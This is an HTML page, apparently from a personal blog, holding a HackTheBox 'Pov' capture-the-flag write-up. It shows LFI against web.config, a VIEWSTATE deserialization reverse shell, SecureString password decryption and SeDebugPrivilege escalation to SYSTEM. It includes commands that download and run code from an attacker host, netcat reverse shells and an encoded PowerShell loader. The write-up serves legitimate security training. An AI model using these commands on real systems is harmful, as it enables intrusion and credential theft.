@@ -1,0 +1,905 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta charset='utf-8'>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="index, follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
+    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+    crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
+    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
+    crossorigin="anonymous"></script>
+  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
+  <script type="text/javascript" async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+    </script>
+  <link rel="stylesheet" href="/assets/css/style.css?v=344a5204a31d528fd0cd88be0fd788f52b2ba77a">
+  <link rel="stylesheet" href="/assets/css/prism.css">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
+  
+  <meta name="theme-color" content="#000000" />
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox Pov Writeup | Gabriel’s writeups</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="HackTheBox Pov Writeup" />
+<meta name="author" content="gabri47" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Pov is a Windows machine with a medium difficulty rating in which we have to do the following things. First, we have to abuse a LFI, to see web.config and consequently craft a serialized payload for VIEWSTATE with ysoserial.exe to gain access as sfitz. Then, to gain access as alaading, we can see a powershell SecureString password in a XML file. Finally, we can abuse SeDebugPrivilege of alaading for attaching to a process running as administrator and gain a shell as administrator." />
+<meta property="og:description" content="Pov is a Windows machine with a medium difficulty rating in which we have to do the following things. First, we have to abuse a LFI, to see web.config and consequently craft a serialized payload for VIEWSTATE with ysoserial.exe to gain access as sfitz. Then, to gain access as alaading, we can see a powershell SecureString password in a XML file. Finally, we can abuse SeDebugPrivilege of alaading for attaching to a process running as administrator and gain a shell as administrator." />
+<link rel="canonical" href="http://localhost:4000/writeups/2024/HTB/Pov.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/2024/HTB/Pov.html" />
+<meta property="og:site_name" content="Gabriel’s writeups" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-06-08T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox Pov Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-06-08T00:00:00+02:00","datePublished":"2024-06-08T00:00:00+02:00","description":"Pov is a Windows machine with a medium difficulty rating in which we have to do the following things. First, we have to abuse a LFI, to see web.config and consequently craft a serialized payload for VIEWSTATE with ysoserial.exe to gain access as sfitz. Then, to gain access as alaading, we can see a powershell SecureString password in a XML file. Finally, we can abuse SeDebugPrivilege of alaading for attaching to a process running as administrator and gain a shell as administrator.","headline":"HackTheBox Pov Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2024/HTB/Pov.html"},"url":"http://localhost:4000/writeups/2024/HTB/Pov.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+</head>
+
+<body>
+
+  <div id="header">
+    <div class="container">
+      <div class="title-container">
+        <a id="a-title" href="/">
+          <h1>Gabriel's writeups</h1>
+        </a>
+        <small class="nav-main d-flex justify-content-center">
+    
+    <a href = "/writeups">Writeups</a>
+    
+    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
+    
+    
+    <a href = "/solutions">Solutions</a>
+    
+    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
+    
+    
+    <a href = "/blog">Blog</a>
+    
+    
+</small>
+      </div>
+      <br>
+
+      
+      
+<nav class="navbar navlinks">
+    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
+        <span>HTB Writeups</span>
+        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
+    </button>
+
+    <div class="navbar-collapse collapse" id="navbarSupportedContent">
+        <div class="m-1 mt-2">
+
+            
+            
+            
+
+            
+            
+            
+
+            <small class="m-2">2024</small>
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Codify.html"> HackTheBox Codify Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Hospital.html"> HackTheBox Hospital Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Surveillance.html"> HackTheBox Surveillance writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Devvortex.html"> HackTheBox Devvortex Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Napper.html"> HackTheBox Napper Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Monitored.html"> HackTheBox Monitored Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;udp/&gt; &lt;snmp/&gt; &lt;nagiosxi/&gt; &lt;api/&gt; &lt;nagios_rce/&gt; &lt;sudoers/&gt; &lt;abusing_nagios_scripts/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Ouija.html"> HackTheBox Ouija Writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;html_inspection/&gt; &lt;information_leakage/&gt; &lt;haproxy/&gt; &lt;http_request_smuggling/&gt; &lt;CVE-2021-40346/&gt; &lt;source_code_inspection/&gt; &lt;hash_extension_attack/&gt; &lt;lfi/&gt; &lt;proc_files/&gt; &lt;php_plugin/&gt; &lt;integer_overflow/&gt; &lt;buffer_overflow/&gt; &lt;webshell/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Bizness.html"> HackTheBox Bizness Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;apache_ofbiz/&gt; &lt;CVE-2023-51467/&gt; &lt;CVE-2023-49070/&gt; &lt;hash_cracking/&gt; &lt;hash_salt/&gt; &lt;su/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Analysis.html"> HackTheBox Analysis Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;ldap-injection/&gt; &lt;php-shell/&gt; &lt;upload-vulnerabilities/&gt; &lt;autologon/&gt; &lt;dll-injection/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Pov.html"> HackTheBox Pov Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;web.config/&gt; &lt;deserialization/&gt; &lt;exploiting-viewstate/&gt; &lt;decrypting-securestring/&gt; &lt;sedebugprivilege/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                
+            </ul>
+
+            
+            
+
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+      
+
+      
+      <div id="bottom-bar">
+        <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+      </div>
+    </div>
+  </div>
+
+  <div id="content" class="container">
+    <section id="main_content">
+      <h5 class="mt-0 mb-2">
+        
+        
+          HTB
+        
+        
+      </h5>
+    
+      <h1 class="d-flex w-100 justify-content-between">
+        
+        
+          <span>HackTheBox Pov Writeup</span> <span class="points"> [30 pts] </span>
+        
+        
+      </h1>
+
+
+<script>
+
+</script>
+
+<p>Pov is a Windows machine with a medium difficulty rating in which we have to do the following things. First, we have to abuse a LFI, to see web.config and consequently craft a serialized payload for VIEWSTATE with ysoserial.exe to gain access as sfitz. Then, to gain access as alaading, we can see a powershell SecureString password in a XML file. Finally, we can abuse SeDebugPrivilege of alaading for attaching to a process running as administrator and gain a shell as administrator.</p>
+    
+      <h1 id="enumeration">
+        
+        
+          Enumeration <a href="#enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+    
+      <h2 id="port-scanning">
+        
+        
+          Port scanning <a href="#port-scanning" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>We start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:</p>
+
+<pre><code class="language-bash">❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.251
+# Nmap 7.94SVN scan initiated Thu May  9 22:30:52 2024 as: nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn -oN tcpTargeted 10.10.11.251
+Nmap scan report for 10.10.11.251
+Host is up (0.13s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-favicon: Unknown favicon MD5: E9B5E66DEBD9405ED864CAC17E2A888E
+|_http-title: pov.htb
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu May  9 22:31:31 2024 -- 1 IP address (1 host up) scanned in 39.19 seconds
+</code></pre>
+
+<ul>
+  <li>-sVC: Identifies service and version.</li>
+  <li>-p-: scans all the range of ports (1-65535).</li>
+  <li>–open: shows only open ports and not filtered or closed.</li>
+  <li>-sS: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
+  <li>–min-rate 5000: Sends 5000 packets per second to improve velocity (don’t do this in a 
+real environment).</li>
+  <li>-n: Disables DNS resolution protocol.</li>
+  <li>-v: Enables verbose to see which ports are opened while it’s scanning</li>
+  <li>-Pn: Disables host discovery protocol (ping).</li>
+  <li>-oN targeted: Exports the evidence to a file named “tcpTargeted”.</li>
+</ul>
+    
+      <h2 id="web-enumeration">
+        
+        
+          Web enumeration <a href="#web-enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>First let’s see the technologies used with whatweb:</p>
+<pre><code class="language-bash">❯ whatweb http://10.10.11.251
+http://10.10.11.251 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sfitz@pov.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.251], Microsoft-IIS[10.0], Script, Title[pov.htb], X-Powered-By[ASP.NET]
+</code></pre>
+
+<p>We see the domain pov.htb in the title, so add this line to the /etc/hosts:</p>
+
+<pre><code class="language-plaintext">10.10.11.251 pov.htb
+</code></pre>
+
+<p>This domain doesn’t look nothing different:</p>
+
+<pre><code class="language-bash">❯ whatweb http://pov.htb
+http://pov.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sfitz@pov.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.251], Microsoft-IIS[10.0], Script, Title[pov.htb], X-Powered-By[ASP.NET]
+</code></pre>
+
+<p>Enumerating subdomains, we can see dev.pov.htb:</p>
+
+<pre><code class="language-bash">❯ wfuzz -c -t 100 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.pov.htb" -u http://pov.htb --hh=12330
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://pov.htb/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                
+=====================================================================
+
+000000019:   302        1 L      10 W       152 Ch      "dev"                                                                                                                  
+
+Total time: 0
+Processed Requests: 4989
+Filtered Requests: 4988
+Requests/sec.: 0
+</code></pre>
+
+<p>I will modify the line of above to put it in the /etc/hosts:</p>
+
+<pre><code class="language-plaintext">10.10.11.251 pov.htb dev.pov.htb
+</code></pre>
+
+<p>Let’s see the technologies used here(dev.pov.htb) with whatweb:</p>
+<pre><code class="language-bash">❯ whatweb http://dev.pov.htb
+http://dev.pov.htb [302 Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.251], Microsoft-IIS[10.0], RedirectLocation[http://dev.pov.htb/portfolio/], Title[Document Moved], X-Powered-By[ASP.NET]
+http://dev.pov.htb/portfolio/ [200 OK] ASP_NET[4.0.30319], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.251], JQuery[3.4.1], Meta-Author[Devcrud], Microsoft-IIS[10.0], Script, Title[dev.pov.htb], X-Powered-By[ASP.NET]
+</code></pre>
+
+<p>It redirect us to /portfolio so it seems like a portfolio of somebody.</p>
+    
+      <h1 id="access-as-sfitz">
+        
+        
+          Access as sfitz <a href="#access-as-sfitz" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>Looking at pov.htb, we can see that it’s just a static page. The only interesting thing is that <code>dev</code> subdomain also appears here:</p>
+
+<p><img src="/assets/images/Pov/dev_subdomain_in_main_page.png" alt="Dev subdomain in main page" /></p>
+
+<p>Looking at dev.pov.htb, we can see a ‘Download CV’ link that if we intercept with burpsuite, we can see that it requests for a file called <code>cv.pdf</code>:</p>
+
+<p><img src="/assets/images/Pov/download_cv_in_burpsuite.png" alt="Download CV in burpsuite" /></p>
+
+<p>Trying LFI (as it searches for a file), works successfully and we can see web.config:</p>
+
+<p><img src="/assets/images/Pov/web.config_in_lfi.png" alt="web.config in LFI" /></p>
+
+<p>So we can follow <a href="https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/">this guide</a> and craft a payload that gives us reverse shell. For that, I will spawn a nc listener and use a windows virtual machine to download ysoserial.net and craft the payload with a command from <a href="https://revshells.com">revshells.com</a>(Powershell #3 Base64):</p>
+
+<pre><code class="language-bash">❯ rlwrap nc -lvnp 443
+listening on [any] 443 ...
+</code></pre>
+
+<p><img src="/assets/images/Pov/ysoserial_command_in_windows.png" alt="ysoserial command in windows" /></p>
+
+<p>Copy the payload and paste it in <code>_VIEWSTATE</code> value:</p>
+
+<p><img src="/assets/images/Pov/payload_pasted_in_viewstate.png" alt="payload_pasted_in_viewstate" /></p>
+
+<p>We receive the shell:</p>
+
+<p><img src="/assets/images/Pov/shell_received.png" alt="Shell received" /></p>
+
+<p>Now I will stabilize the shell with ConPtyShell to be able to do ctrl+c, see the errors of powershell and have autocompletion. For this, I will use a http server to share the ps1 script, spawn a nc listener and execute this commands in the victim:</p>
+
+<pre><code class="language-powershell">PS C:\Users\sfitz\Documents&gt; IEX(New-Object Net.WebClient).downloadString("http://10.10.14.225/Invoke-ConPtyShell.ps1")
+PS C:\Users\sfitz\Documents&gt; Invoke-ConPtyShell -RemoteIp 10.10.14.225 -RemotePort 443 -Rows 50 -Cols 184
+</code></pre>
+
+<p>Also, in the nc listener, we have to do ctrl+z, execute <code>stty raw -echo; fg</code> and do ctrl+l.</p>
+    
+      <h1 id="access-as-alaading">
+        
+        
+          Access as alaading <a href="#access-as-alaading" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>In the Documents folder of sfitz there is a connection.xml file that has credentials for alaading:</p>
+
+<pre><code class="language-powershell">PS C:\Users\sfitz\Documents&gt; type connection.xml
+&lt;Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"&gt;
+  &lt;Obj RefId="0"&gt;
+    &lt;TN RefId="0"&gt;
+      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
+      &lt;T&gt;System.Object&lt;/T&gt;
+    &lt;/TN&gt;
+    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
+    &lt;Props&gt;
+      &lt;S N="UserName"&gt;alaading&lt;/S&gt;
+      &lt;SS N="Password"&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&lt;/SS&gt;
+    &lt;/Props&gt;
+  &lt;/Obj&gt;
+&lt;/Objs&gt;
+</code></pre>
+
+<p>So we can decrypt it with this command:</p>
+
+<pre><code class="language-powershell">PS C:\Users\sfitz\Documents&gt; $cred = Import-CliXml -Path .\connection.xml; $cred.GetNetworkCredential() | Format-List *
+
+
+UserName       : alaading
+Password       : f8gQ8fynP44ek1m3
+SecurePassword : System.Security.SecureString 
+Domain         :
+</code></pre>
+
+<p>Now with this credential, we are able to execute a command as alaading. In my case I will execute a reverse shell with RunasCs.exe:</p>
+
+<pre><code class="language-bash">❯ nc -lvnp 443
+listening on [any] 443 ...
+</code></pre>
+
+<pre><code class="language-powershell">PS C:\Users\sfitz\Documents&gt; cd C:\Windows\Temp
+PS C:\Windows\Temp&gt; mkdir test
+
+
+    Directory: C:\Windows\Temp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         6/8/2024   2:21 PM                test
+
+
+PS C:\Windows\Temp&gt; cd .\test\
+PS C:\Windows\Temp\test&gt;  certutil.exe -f -urlcache -split http://10.10.14.225/RunasCs.exe
+****  Online  ****
+  0000  ...
+  ca00
+CertUtil: -URLCache command completed successfully.
+PS C:\Windows\Temp\test&gt; .\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.14.225:443
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-8e17e$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 1664 created in background.
+</code></pre>
+
+<p>And we receive it</p>
+<pre><code class="language-powershell">❯ nc -lvnp 443
+listening on [any] 443 ...
+PS C:\Users\alaading\Documents&gt;
+</code></pre>
+
+<p>Also, I will use ConPtyShell as before for having a better shell.</p>
+    
+      <h1 id="access-as-nt-authoritysystem">
+        
+        
+          Access as nt authority/system <a href="#access-as-nt-authoritysystem" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>Looking at our privileges, we can see SeDebugPrivilege, which we can abuse as shown <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sedebugprivilege">here</a> with <a href="https://github.com/bruno-1337/SeDebugPrivilege-Exploit">this tool</a>:</p>
+<pre><code class="language-powershell"># Download
+PS C:\Users\alaading\Documents&gt; cd C:\Windows\Temp
+PS C:\Windows\Temp&gt; mkdir privesc
+
+
+    Directory: C:\Windows\Temp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         6/8/2024   1:53 PM                privesc
+
+
+PS C:\Windows\Temp&gt; cd privesc
+PS C:\Windows\Temp\privesc&gt; certutil.exe -f -urlcache -split http://10.10.14.225/SeDebugPrivesc.exe
+****  Online  ****
+  0000  ...
+  4600
+CertUtil: -URLCache command completed successfully.
+
+# See processes running as administrator 
+PS C:\Users\alaading\Documents&gt; Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
+
+ProcessName     Id 
+-----------     -- 
+chisel        1300 
+chisel        4872 
+cmd            644 
+cmd            828 
+cmd           1048 
+cmd           4108 
+cmd           4464 
+conhost        692 
+conhost       1664 
+conhost       3684 
+conhost       4376 
+conhost       4420 
+conhost       4688 
+conhost       4748 
+conhost       4936 
+csrss          380 
+csrss          488 
+dllhost       3512 
+dwm            988 
+fontdrvhost    784 
+fontdrvhost    792 
+Idle             0 
+LogonUI       4148 
+lsass          632 
+msdtc         3876 
+powershell      64 
+powershell      96 
+powershell    1372 
+powershell    1692 
+powershell    2952 
+powershell    3196 
+powershell    3372 
+powershell    3968 
+powershell    4780 
+powershell    4848 
+Registry        88 
+services       616 
+shell         5052 
+smss           296 
+System           4 
+VGAuthService 2296 
+vm3dservice   2288 
+vm3dservice   2940 
+vmtoolsd      2308 
+w3wp          4432 
+wininit        480 
+winlogon       548
+WmiPrvSE      3840
+wsmprovhost   4040
+</code></pre>
+
+<p>The process <code>winlogon</code> always run as Administrator, so we can use this PID and test if we can execute commands by doing a ping to our machine and listening with tcpdump for icmp packets:</p>
+
+<pre><code class="language-powershell">PS C:\Windows\Temp\privesc&gt; .\SeDebugPrivesc.exe 548 "C:\windows\system32\cmd.exe /c ping -n 1 10.10.14.225"
+pid= 548
+[+] New process is created successfully.
+    |-&gt; PID : 2952
+    |-&gt; TID : 4788
+</code></pre>
+
+<p>We receive the icmp packet:</p>
+
+<pre><code class="language-bash">❯ sudo tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+11:14:41.545966 IP pov.htb &gt; kali: ICMP echo request, id 1, seq 1, length 40
+11:14:41.546005 IP kali &gt; pov.htb: ICMP echo reply, id 1, seq 1, length 40
+</code></pre>
+
+<p>Now we can use a nc.exe binary to have a shell of administrator:</p>
+
+<pre><code class="language-powershell">PS C:\Windows\Temp\privesc&gt; certutil.exe -f -urlcache -split "http://10.10.14.225/nc.exe"
+****  Online  ****
+  0000  ...
+  6e00
+CertUtil: -URLCache command completed successfully.
+PS C:\Windows\Temp\privesc&gt; .\SeDebugPrivesc.exe 548 ".\nc.exe -e cmd.exe 10.10.14.225 443"
+pid= 548
+[+] New process is created successfully.
+    |-&gt; PID : 3632
+    |-&gt; TID : 3504
+</code></pre>
+
+<p>And we receive the shell:</p>
+
+<pre><code class="language-bash">❯ rlwrap nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.225] from (UNKNOWN) [10.10.11.251] 50226
+Microsoft Windows [Version 10.0.17763.5329]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\Temp\privesc&gt;
+</code></pre>
+
+<p>For some reason we can’t execute some commands so I will upgrade my alaading shell to a winrm session with the credentials I have. For that I will use chisel to transfer port 5985 to my machine:</p>
+
+<p>Server:</p>
+<pre><code class="language-bash">❯ ./chisel_linux server --reverse -p 1234
+2024/06/09 11:45:27 server: Reverse tunnelling enabled
+2024/06/09 11:45:27 server: Fingerprint ts/bkY9kZ0ffl5bFrAdhQdGTAe9AjiEgzTPuqIFqW5c=
+2024/06/09 11:45:27 server: Listening on http://0.0.0.0:1234
+</code></pre>
+
+<p>Client:</p>
+
+<pre><code class="language-powershell">PS C:\windows\Temp\privesc&gt; .\chisel_windows.exe client 10.10.14.225:1234 R:5985:127.0.0.1:5985
+</code></pre>
+
+<p>Now we can login to winrm:</p>
+
+<pre><code class="language-powershell">❯ evil-winrm -i localhost -u alaading -p 'f8gQ8fynP44ek1m3'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\alaading\Documents&gt; 
+</code></pre>
+
+<p>Now execute SeDebugPrivesc to execute ConPtyShell as Administrator:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Windows\Temp\test&gt; .\SeDebugPrivesc.exe 548 "powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBk
+AFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMgA1AC8ASQBuAHYAbwBrAGUALQBDAG8AbgBQAHQAeQBTAGgAZQBsAGwALgBwAHMAMQAnACkAOwAgAEkAbgB2AG8AawBlAC0AQwBvAG4AUAB0AHkAUwBo
+AGUAbABsACAALQBSAGUAbQBvAHQAZQBJAHAAIAAxADAALgAxADAALgAxADQALgAyADIANQAgAC0AUgBlAG0AbwB0AGUAUABvAHIAdAAgADQANAAzACAALQBSAG8AdwBzACAANQAwACAALQBDAG8AbABzACAAMQA4ADQA"
+pid= 548
+[+] New process is created successfully.
+    |-&gt; PID : 4476
+    |-&gt; TID : 1964
+</code></pre>
+
+<p>And we receive the shell as nt authority/system with root.txt readable:</p>
+
+<pre><code class="language-powershell">PS C:\Windows\Temp\test&gt; whoami
+nt authority\system
+PS C:\Windows\Temp\test&gt; type C:\Users\Administrator\Desktop\root.txt 
+30****************************4b 
+</code></pre>
+
+<p>That’s the machine. Hope you liked it :).</p>
+
+
+<div id="share-links">
+  <span id="divider-line">____</span>
+  <br><br>
+  <small>8 June 2024</small>
+  <div>
+    
+    Tags:
+    
+    <a href="/search?q=lfi" class="tag" style="font-family: 'Cascadia Code';">lfi</a>
+    
+    <a href="/search?q=web.config" class="tag" style="font-family: 'Cascadia Code';">web.config</a>
+    
+    <a href="/search?q=deserialization" class="tag" style="font-family: 'Cascadia Code';">deserialization</a>
+    
